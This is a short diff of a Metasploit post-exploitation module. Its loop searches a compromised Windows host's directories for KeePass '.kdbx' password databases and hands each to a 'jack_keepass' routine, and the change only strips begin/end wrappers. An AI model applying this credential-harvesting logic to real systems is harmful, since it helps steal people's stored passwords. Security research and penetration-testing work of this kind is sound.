@@ -41,10 +41,8 @@ class Metasploit3 < Msf::Post
 			files = client.fs.dir.entries(dir)
 			files.each do |f|
 				if f.to_s.include?(".kdbx")
-					begin
 						filelocation = dir + "\\" + f
 						jack_keepass(filelocation)
-					end
 				end
 			end
 		end
@@ -56,10 +54,8 @@ class Metasploit3 < Msf::Post
 			files = client.fs.dir.entries(dir)
 			files.each do |f|
 				if f.to_s.include?(".kdbx")
-					begin
 						filelocation = dir + "\\" + f
 						jack_keepass(filelocation)
-					end
 				end
 			end
 		end
